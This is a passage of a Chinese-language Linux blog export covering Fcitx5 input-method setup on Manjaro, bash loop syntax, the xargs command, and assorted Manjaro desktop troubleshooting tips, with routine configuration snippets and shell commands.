        <content type="html"><![CDATA[<h2 id="卸载-fcitx4">卸载 Fcitx4</h2><p>首先把卸载系统中 fcitx4 相关包:</p><p><code>sudo pacman -Rs $(pacman -Qsq fcitx)</code></p><h2 id="安装-fcitx5">安装 fcitx5</h2><p>以下安装二选一，切忌带 <code>-git</code> 后缀的和不带<code>-git</code> 的包一起安装（当然，一些词库啥的没事）。</p><p>稳健安装（安装 community 源的 fcitx5）：</p><p><code>sudo pacman -S fcitx5-chinese-addons fcitx5 fcitx5-gtk fcitx5-qt kcm-fcitx5</code></p><p>注意：<code>kcm-fcitx5</code> 为 KDE 桌面的图形化配置 fcitx5 包。</p><p>激进安装（archlinuxcn 源的 fcitx5）:</p><p><code>yay -S fcitx5-chinese-addons-git fcitx5-configtool-git fcitx5-git fcitx5-gtk-git fcitx5-qt5-git fcitx5-pinyin-zhwiki</code></p><p>fcitx5: 输入法基础框架主程序 fcitx5-chinese-addons:简体中文输入的支持，云拼音 fcitx5-gtk: GTK 程序的支持 fcitx5-qt: QT5程序的支持 fcitx5-pinyin-zhwiki: 肥猫制作的维基百万词库，没有版权风险,放心使用 kcm-fcitx5: KDE 桌面环境的支持，最近换为了<code>fcitx5-configtool-git</code>， manjaro还没更新到，不过可以手动安装。</p><h2 id="设置-fcitx5-初始配置">设置 Fcitx5 初始配置</h2><p>配置 Group 直接启动 fcitx5 是只有西文键盘的，如果是KDE，可以到系统的输入法配置启用拼音。如果是别的桌面的话，把下面的内容粘贴到<code>~/.config/fcitx5/profile</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[Groups/0]</span><br><span class="line"># Group Name</span><br><span class="line">Name=Default</span><br><span class="line"># Layout</span><br><span class="line">Default Layout=us</span><br><span class="line"># Default Input Method</span><br><span class="line">DefaultIM=pinyin</span><br><span class="line"></span><br><span class="line">[Groups/0/Items/0]</span><br><span class="line"># Name</span><br><span class="line">Name=keyboard-us</span><br><span class="line"># Layout</span><br><span class="line">Layout=</span><br><span class="line"></span><br><span class="line">[Groups/0/Items/1]</span><br><span class="line"># Name</span><br><span class="line">Name=pinyin</span><br><span class="line"># Layout</span><br><span class="line">Layout=</span><br><span class="line"></span><br><span class="line">[GroupOrder]</span><br><span class="line">0=Default</span><br></pre></td></tr></table></figure><p><code>DefaultIM=xx</code> 为设置默认输入法，如果你习惯使用rime,后面安装好之后可以设置成 rime。</p><p>配置文件在注销重新登陆之后就会生效，届时启动 fcitx5 即可体验。</p><h3 id="配置环境变量">配置环境变量</h3><p>修改 <code>~/.pam_environment</code>，添加如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GTK_IM_MODULE=fcitx5</span><br><span class="line">QT_IM_MODULE=fcitx5</span><br><span class="line">XMODIFIERS=&quot;@im=fcitx5&quot;</span><br></pre></td></tr></table></figure><p>使用 <code>echo $&#123;XDG_SESSION_TYPE&#125;</code> 命令查看，如果是 x11用户，则还应当在<code>~/.xprofile</code>添加如下内容：<code>fcitx5 &amp;</code></p><h2 id="fcitx5-rime">fcitx5-rime</h2><p><code>sudo pacman -S fcitx5-rime fcitx5-pinyin-zhwiki-rime</code>或者 <code>yay -S fcitx5-rime-git fcitx5-pinyin-zhwiki-rime</code></p><p>新版兼容旧版配置，可以直接使用命令复制配置与词库：<code>cp -r ~/.config/fcitx/rime ~/.local/share/fcitx5/rime</code></p><h2 id="个性化">个性化</h2><h3 id="关闭云拼音">关闭云拼音</h3><p>修改 <code>~/.config/fcitx5/conf/pinyin.conf</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Enable Cloud Pinyin</span><br><span class="line">CloudPinyinEnabled=False</span><br></pre></td></tr></table></figure><h3 id="关闭自动-dpi">关闭自动 DPI</h3><p>fcitx5 会自动根据多显示器不同的 DPI来调整界面大小，但可能会造成了一些困扰，将这一功能关闭，并调整字体大小为14。</p><p>修改<code>~/.config/fcitx5/conf/classicui.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 按屏幕 DPI 使用</span><br><span class="line">PerScreenDPI=False</span><br><span class="line"></span><br><span class="line"># Font (设置成你喜欢的字体)</span><br><span class="line">Font=&quot;Noto Sans Regular 14&quot;</span><br></pre></td></tr></table></figure><h3 id="自定义快速输入">自定义快速输入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#在 fcitx5 数据文件夹建立 mb 文件</span><br><span class="line">sudo touch /usr/share/fcitx5/data/quickphrase.d/quick.mb</span><br><span class="line"># 使用 vim 编辑自定义输入</span><br><span class="line">sudo vim /usr/share/fcitx5/data/quickphrase.d/quick.mb</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在文件中添加形如<code>input output</code>的代码，一行一条，即可实现添加快速输入辞典。</p><p>示例：要在快速输入中输入<code>eg</code>，在候选中显示<code>e.g.</code>，只需在上述mb 文件中添加一行<code>eg e.g.</code>即可。</p><p><em>友情提示：快速输入可以使用分号打开，Rime不支持快速输入。</em></p><h2 id="皮肤">皮肤</h2><p><ahref="https://github.com/hosxy/fcitx5-dark-transparent">fcitx5-dark-transparent</a></p><h3 id="用单行模式inline_preedit">用单行模式(inline_preedit)</h3><p>上图就是单行模式，非常好看，推荐开启</p><p>对于 fcitx5 自带 pinyin 请修改<code>~/.config/fcitx5/conf/pinyin.conf</code></p><p>对于 fcitx5-rime，请新建/修改<code>~/.config/fcitx5/conf/rime.conf</code></p><p>加入/修改以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 可用时在应用程序中显示预编辑文本</span><br><span class="line">PreeditInApplication=True</span><br></pre></td></tr></table></figure><blockquote><p>输入法配置完成后，如果没有达到应该达到的效果，建议先重启 fcitx5 或者logout 或者重启电脑，以便配置生效。</p></blockquote><h2 id="参考教程">参考教程</h2><blockquote><ol type="1"><li><a href="https://www.wannaexpresso.com/2020/03/26/fcitx5/">在Manjaro 上优雅地使用 Fcitx5 含 fcitx5+rime</a></li><li><ahref="https://manateelazycat.github.io/linux/2020/06/19/fcitx5-is-awesome.html">配置Fcitx5 输入法, 肥猫百万词库就是赞</a></li><li><ahref="https://github.com/hosxy/fcitx5-dark-transparent">fcitx5-dark-transparent</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell 循环</title>
      <link href="/blog/2020/08/03/programming/shell/7.loop/"/>
      <url>/blog/2020/08/03/programming/shell/7.loop/</url>
      
        <content type="html"><![CDATA[<h2 id="for-循环">for 循环</h2><p>bash shell 中 for 命令的基本格式。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for var in list; do</span><br><span class="line">    commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>在 commands 中， <code>$var</code>变量包含着这次迭代对应的当前列表项中的值。 在 list参数中，你需要提供迭代中要用到的一系列值。可以通过几种不同的方法指定列表中的值。下面介绍几种方式</p><h3 id="读取列表中的值">读取列表中的值</h3><p>for 命令最基本的用法就是遍历 for命令自身所定义的一系列值。<strong>for循环假定每个值都是用空格分割的.</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for name in xiaoming zhangsan lisi wangwu</span><br><span class="line">do</span><br><span class="line">    echo &quot;the name is &quot; $name</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>两个注意事项：</p><ol type="1"><li><p>列表值中有单引号</p><p>shell看到了<strong>列表值中的单引号</strong>并尝试使用它们来定义一个单独的数据值</p><p>解决方法：</p><ol type="1"><li>使用 <code>\</code>对单引号进行转义</li><li>使用双引号将该列表值括起来 在某个值两边使用双引号时，shell并不会将双引号当成值的一部分。</li></ol></li><li><p>列表值中含有空格</p><p>解决方法：使用双引号将该列表值括起来</p></li></ol><h3 id="从变量读取列表">从变量读取列表</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> test.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">list=&quot;item1 item2 item3&quot;</span><br><span class="line">list=$list&quot; item4&quot;</span><br><span class="line">for item in $list</span><br><span class="line">do</span><br><span class="line">    echo &quot;this is $item&quot;</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~/codespace/sh_test [21:38:43]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./test.sh</span></span><br><span class="line">this is item1</span><br><span class="line">this is item2</span><br><span class="line">this is item3</span><br><span class="line">this is item4</span><br></pre></td></tr></table></figure><p><code>$list</code>变量包含了用于迭代的标准文本值列表。代码还用了另一个赋值语句向<code>$list</code>变量包含的已有列表中添加（或者说是拼接）了一个值。这是向变量中存储的已有文本字符串尾部添加文本的一个常用方法。</p><h3 id="从命令读取值">从命令读取值</h3><p>结合命令替换，从遍历命令的结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for i in $(ls ~);do</span><br><span class="line">    echo &quot;$i&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h3 id="生成序列">生成序列</h3><h4 id="序列表达式">序列表达式</h4><p>序列表达式是花括号展开(brace expansion)特性的一个功能。</p><p>序列表达式的语法是：<code>&#123;&lt;START&gt;..&lt;END&gt;[..&lt;INCR&gt;]&#125;</code></p><p>示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;a..g&#125;;do</span><br><span class="line">    echo $i</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="seq">seq</h4><p><code>seq</code> 命令用来生成序列：</p><blockquote><p>NAME seq - print a sequence of numbers</p><p>SYNOPSIS seq [OPTION]... LAST seq [OPTION]... FIRST LAST seq[OPTION]... FIRST INCREMENT LAST</p></blockquote><h4 id="题目与题解">题目与题解</h4><p>题目：<ahref="https://www.hackerrank.com/challenges/bash-tutorials---looping-and-skipping/problem?h_r=next-challenge&amp;h_v=zen">Loopingand Skipping</a></p><h4 id="题解">题解</h4><p>思路是直接生成跳过偶数的序列。当然，直接生成全序列，然后判断也可。</p><ol type="1"><li><p>花括号扩展的序列生成表达式(最佳)</p><p>Using in-built ranges (like for x in {1..99..2}) is much faster.</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for num in &#123;1..99..2&#125;;do</span><br><span class="line">    echo $num</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p><p>Note that <strong>bash doesn't support variables in brace rangeexpansions.</strong></p><p>题目练习：<ahref="https://www.hackerrank.com/challenges/bash-tutorials---compute-the-average/problem">Computethe Average</a></p></li><li><p><code>seq</code> 生成序列</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for num in $(seq 1 2 99);do</span><br><span class="line">    echo $num</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p></li><li><p>全序列，判断</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for i in &#123;1..99&#125;; do</span><br><span class="line">    if test $(expr $i % 2) -ne 0; then</span><br><span class="line">        echo $i</span><br><span class="line">    fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p></li></ol><h3 id="用通配符读取目录">用通配符读取目录</h3><p>进行此操作时，必须在文件名或路径名中使用通配符。它会强制 shell使用文件扩展匹配。文件扩展匹配是生成匹配指定通配符的文件名或路径名的过程。如果不知道所有的文件名，这个特性在处理目录中的文件时就非常好用。</p><p>例如：<code>for file in /home/rich/test/*</code></p><h3 id="c-语言风格的-for-命令">C 语言风格的 for 命令</h3><p>C 语言风格的 for命令也允许为迭代使用多个变量。循环会单独处理每个变量，你可以为每个变量定义不同的迭代过程。尽管可以使用多个变量，但你只能在for 循环中定义一种条件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (( variable assignment ; condition ; iteration process )); do</span><br><span class="line">    commands</span><br><span class="line">done</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for (( i=1; i &lt;= 10; i++ ))</span><br><span class="line">do</span><br><span class="line"> echo &quot;The next number is $i&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">for (( a=1, b=10; a &lt;= 10; a++, b-- ))</span><br><span class="line">do</span><br><span class="line"> echo &quot;$a - $b&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h2 id="while">while</h2><p>格式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while test command</span><br><span class="line">do</span><br><span class="line"> other commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>while 命令中定义的 test command 和 if-then语句中的格式一模一样。最常见的 test command的用法是用方括号来检查循环命令中用到的 shell 变量的值</p><h2 id="until">until</h2><p>until命令要求你指定一个通常返回非零退出状态码的测试命令。只有测试命令的退出状态码不为0，bash shell 才会执行循环中列出的命令。 一旦测试命令返回了退出状态码0，循环就结束了。</p><p>格式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">until test commands</span><br><span class="line">do</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h2 id="处理循环">处理循环</h2><ol type="1"><li><code>break</code>和 <code>continue</code>关键字和其他语言一样用法</li><li>处理循环的输出 可以对循环的输出使用管道或进行重定向。这可以通过在done 命令之后添加一个处理命令来实现。</li></ol><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li>Linux 命令行与 Shell 脚本编程大全</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xargs 命令</title>
      <link href="/blog/2020/08/01/linux/tools/xargs/"/>
      <url>/blog/2020/08/01/linux/tools/xargs/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文主要翻译自 <a href="https://shapeshed.com/unix-xargs/">Linux andUnix xargs command tutorial with examples</a></p></blockquote><h2 id="简介">简介</h2><p><code>xargs</code> 命令用于从标准输入中构建执行管道和执行命令行。像<code>grep</code> 命令等可以从接受管道输入作为参数，而其他工具，像<code>echo</code>, <code>rm</code>, <code>mkdir</code>, <code>ls</code>等却不能。我们可以借助 xargs 来使他们接受管道输入作为参数。</p><h2 id="使用">使用</h2><p>默认情况下，<code>xargs</code>从由空格分隔的标准输入中读取项，并对每个参数执行一次命令。</p><p>下面例子中通过管道将标准输入传递给<code>xargs</code>，然后它执行每个参数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;one two three&quot;</span> | xargs <span class="built_in">mkdir</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">one  three  two</span><br></pre></td></tr></table></figure><h2 id="xargs-与-find-配合使用">xargs 与 find 配合使用</h2><p><code>xrags</code> 最常见的用法就是和 <code>find</code>一起使用。一般是使用 <code>find</code> 来搜索文件和目录，然后使用<code>xargs</code> 来处理结果。典型的例子是改变所有权或者移动文件。</p><p>下面例子中，查找 2 周以前的文件，然后通过管道将结果传给<code>xargs</code> 来进行删除操作。</p><p><code>sudo find /tmp -mtime +10|xargs rm -f</code></p><p>报错提示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo find /tmp -mtime +10|xargs <span class="built_in">rm</span></span></span><br><span class="line">rm: missing operand</span><br><span class="line">Try &#x27;rm --help&#x27; for more information.</span><br></pre></td></tr></table></figure><p>原因： <code>find</code> 查找的结果集为空，导致 <code>rm</code>接受到空参数</p><h2 id="xargs-v-exec">xargs v exec</h2><p><code>find</code> 命令支持 -exec 选项来对结果执行任意的操作。</p><p>下面两个版本的效果是一致的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find ./foo -type f -name &quot;*.txt&quot; -exec rm -f &#123;&#125; \;</span><br><span class="line">find ./foo -type f -name &quot;*.txt&quot; | xargs rm -f</span><br></pre></td></tr></table></figure><p>一些测试（见文末参考资料）表示 <code>xargs</code> 比<code>exec &#123;&#125;</code> 快六倍</p><h2 id="打印执行的命令">打印执行的命令</h2><p><code>-t</code> 选项打印每一条将会在终端执行的命令。</p><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;one two three&#x27;</span> | xargs -t <span class="built_in">rm</span> -rf</span></span><br><span class="line">rm -rf one two three</span><br></pre></td></tr></table></figure><h2 id="打印并提示询问命令">打印并提示询问命令</h2><p><code>-p</code> 选项会打印要执行的命令，并提示用户是否执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;one two three&#x27;</span> | xargs -p <span class="built_in">touch</span></span></span><br><span class="line">touch one two three ?...y</span><br></pre></td></tr></table></figure><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><a href="https://shapeshed.com/unix-xargs/">Linux and Unix xargscommand tutorial with examples</a></li><li><ahref="https://stackoverflow.com/questions/36617999/error-rm-missing-operand-when-using-along-with-find-command/36618260">Error'rm: missing operand' when using along with 'find' command</a></li><li><ahref="https://www.everythingcli.org/find-exec-vs-find-xargs/">find -execvs. find | xargs</a></li><li><a href="https://danielmiessler.com/blog/linux-xargs-vs-exec/">xargsvs. exec {}</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Manjaro 使用问题汇总</title>
      <link href="/blog/2020/07/24/linux/manjaro/manjaro_issues/"/>
      <url>/blog/2020/07/24/linux/manjaro/manjaro_issues/</url>
      
        <content type="html"><![CDATA[<h2 id="忽略包更新">忽略包更新</h2><p>配置文件 <code>/etc/pacman.conf</code> 中的 <code>IgnorePkg</code>那里写上你希望忽略更新的包。例如我忽略了<code>xmind-zen</code>（因为我用的是果壳破解的，怕更新后就失效了。）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">grep -n  <span class="string">&quot;IgnorePkg&quot;</span> /etc/pacman.conf</span></span><br><span class="line">28:# Pacman won&#x27;t upgrade packages listed in IgnorePkg and members of IgnoreGroup</span><br><span class="line">29:IgnorePkg   = xmind-zen</span><br></pre></td></tr></table></figure><h2 id="fcitx-英文补全">fcitx 英文补全</h2><ol type="1"><li><p>激活到并且进入 Fcitx 的英文输入状态,点击任意输入框. 2.按ctrl+alt+H ,以激活 spell hint 状态.3.输入几个英文字母,即可弹出候选单词(即自动补全功能), 可以按 alt加数字,以选取候选单词.</p></li><li><p>为了令补全功能更贴心,可以在 fcitx 设置里的找到"English"(输入法)一栏,双击,进入可有更多设置. 比如把 "choose keymodifier"由 alt 改成 none ,作用：不用按Alt+序号，而是直接按序号即可选词。</p></li></ol><h2 id="桌面意外增加便签">桌面意外增加便签</h2><p>其实这个不是 libinput-gestures的问题。找了半天，我发现是鼠标中键触发了添加便签，而三指点击是 manjaro自带的触摸板手势中键。于是右键桌面配置桌面 →鼠标动作，删除中间动作即可。</p><h2 id="teamviewer-无法使用">teamviewer 无法使用</h2><p>显示 <code>Not ready. Please check your connection</code></p><p>解决方法： 首次安装后，重启电脑，然后 <code>su root</code> 切换到root 模式，命令行启动即可。</p><p>参考：<a href="https://www.cnblogs.com/kunx/p/9158153.html">manjaro安装 teamviewer 后无法打开</a></p><h2 id="deepin-tim-各种问题">deepin tim 各种问题</h2><ol type="1"><li><p>manjaro kde 上 tim 卡死</p><p>解决方案： 卸载你之前导入的 windows 的全部字体</p><p><ahref="https://github.com/countstarlight/deepin-wine-tim-arch/issues/49">manjarokde 上不可用，启动慢+勉强启动卡死 #49</a></p><p>KDE 桌面目前存在不能记住密码的问题。</p><p>我的 Manjaro KDE 只能使用 wine,不能使用deepin-wine,一切换就卡死。</p></li><li><p>字体发虚，中文方框，打不开，调 dpi 等，解决方法见：</p><p><a href="https://github.com/countstarlight/deepin-wine-tim-arch">在Archlinux 及衍生发行版上运行 TIM</a></p></li><li><p>图片一直加载，不显示</p><p><a href="https://www.4gml.com/thread-53.htm">Arch || Manjaro 禁用IPV6</a></p></li></ol><h3 id="kde-桌面-deepin-wine-中焦点的问题">kde 桌面 deepin wine中焦点的问题</h3><p>目前 manjaro kde 下 <code>deepin-wine-tim</code>右键不能鼠标选中功能，因此复制，@，撤回，回复某个人消息都不行。</p><p>临时替代：右键之后，不要鼠标点击，而是要通过键盘上下键和回车来进行。</p><p>此解决方案来自 Arch linux QQ群的憋憋大佬，表示感谢（虽然他可能看不见）， QQ 群号：204097403</p><h2 id="字体">字体</h2><h3 id="manjaro-字体小">manjaro 字体小</h3><ol type="1"><li>font 那里调 dpi</li><li>display 那里调 scale，konsole 打字或选中出现白线 KDE 的 bug：不要去<code>Settings -&gt; Displays and Monitor</code> 那里调节系统的DPI，否则 Konsole 就会出现斜线。</li></ol><h3 id="chrome-ui-字体小">chrome ui 字体小</h3><p>首先，相关版本信息：</p><ol type="1"><li>chrome 版本: Version 83.0.4103.61 (Official Build) (64-bit),</li><li>OS: Manjaro 20.0.1 Lysia</li><li>DE: KDE 5.70.0 / Plasma 5.18.5</li></ol><p>注意: 是 chrome ui （bookmarks、address bar 等），而不是 chrome渲染的网页，后者可以再 setting 中很容易设置。 前者的调节方法:</p><ol type="1"><li><p>查看一下 chrome 启动文件</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span>  /usr/bin/google-chrome-stable</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow <span class="built_in">users</span> to override command-line options</span></span><br><span class="line">if [[ -f ~/.config/chrome-flags.conf ]]; then</span><br><span class="line">   CHROME_USER_FLAGS=&quot;$(cat ~/.config/chrome-flags.conf)&quot;</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Launch</span></span><br><span class="line">exec /opt/google/chrome/google-chrome $CHROME_USER_FLAGS &quot;$@&quot;%</span><br></pre></td></tr></table></figure></p><p>注意到:<code># Allow users to override command-line options</code>以及下面的文件</p></li><li><p>创建 <code>~/.config/chrome-flags.conf</code> 该文件，并写入<code>--force-device-scale-factor=n</code> 其中， <code>n</code>由你自定义，可为小数。我设置为了 <code>1.2</code>, 你可以设置一下n，重启 chrome，观察大小，从而确定适合你的 n 值。</p></li></ol><p>参考: <ahref="https://superuser.com/questions/1116767/chrome-ui-size-zoom-levels-in-ubuntu-16-04">ChromeUI size &amp; zoom levels in Ubuntu 16.04</a></p><h2 id="master-pdf-中文显示输入以及编辑中文时空白">master pdf中文显示，输入以及编辑中文时，空白</h2><ol type="1"><li><p>确保安装好了常用中文字体,教程如下 <ahref="https://blog.frytea.com/archives/296/">为 Linux发行版安装中文字体</a></p></li><li><p>"Tools -&gt; Settings -&gt; Editing" <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200806184959.png"alt="config" /></p><p>这了这两步骤，在编辑中文的时候，就基本可以了。</p></li><li><p>Error "This font doesn’t contain these characters. Try choosinganother font." when editing text.</p><p><ahref="https://code-industry.net/masterpdfeditor-help/possible-issues-with-text/">PossibleIssues with Text</a></p></li></ol><h2 id="manjaro20.0-连接-eduroam-wifi">manjaro20.0 连接 eduroamwifi</h2><p>配置如下：</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200612162738.png"alt="link_eduroam" /><figcaption aria-hidden="true">link_eduroam</figcaption></figure><p>然后，连接 eduroam 后，弹出一次框，再输入一次图片中 Password对应输入的值。</p><p>参考链接： <ahref="https://www.monash.edu/esolutions/network/connect-eduroam-linux">monashConnect to eduroam wi-fi: Linux</a></p><h2 id="真无线蓝牙耳机">真无线蓝牙耳机</h2><p>蓝牙配对、连接成功，可是声音还是外放。重复配对、连接，偶尔蓝牙内放，但是一听歌，就又外放了。</p><p>解决：</p><ol type="1"><li><p><ahref="https://wiki.archlinux.org/index.php/Bluetooth#Installation">archwiki Bluetooth</a> 按照前两步安装，然后重启了蓝牙<code>sudo systemctl restart bluetooth.service</code>，再进行连接（如果此时正常了，就不用下一步了）</p><p><ahref="https://blog.csdn.net/weixin_30460489/article/details/101312239">archlinux蓝牙耳机没有声音</a> 把输出的默认流设置为蓝牙。</p></li><li><p>经过第二部之后，连接上了，但是还是外放。解决：每次连接上蓝牙之后，再启动（即：重启）你用的音视频播放软件，如：vlc，spotify、netease等，就可以了。</p></li></ol><h2 id="声音">声音</h2><h2 id="manjaro-没有声音了">manjaro 没有声音了</h2><p>一条命令：<code>systemctl --user restart pulseaudio.service</code></p><p>应该是整上面的耳机配置整的，不小心把这个服务关闭了 emm</p><p>参考：</p><p><ahref="https://blog.csdn.net/qq_43497702/article/details/104370104">Manjaro没有声音(伪输出)怎么办</a></p><h2 id="声音小">声音小</h2><p>在桌面右上角（仿 Mac 顶部栏）或者右下角（类 Windows任务栏），找小喇叭</p><p>之前可以在下图箭头 1指向的那里进入设置，然后永久设置最大音量的。最近好像升级改了，只剩下箭头2 那里的勾选 <code>Raise maximum volume</code>，勾选后最大音量变为150%，如图:</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200724105146.png"alt="20200724105146" /><figcaption aria-hidden="true">20200724105146</figcaption></figure><p><ahref="之前的设置方法：https://forum.manjaro.org/t/need-more-volume/57555">Needmore volume</a></p><h2 id="ark-解压中文乱码">ark 解压中文乱码</h2><p>Manjaro 默认安装 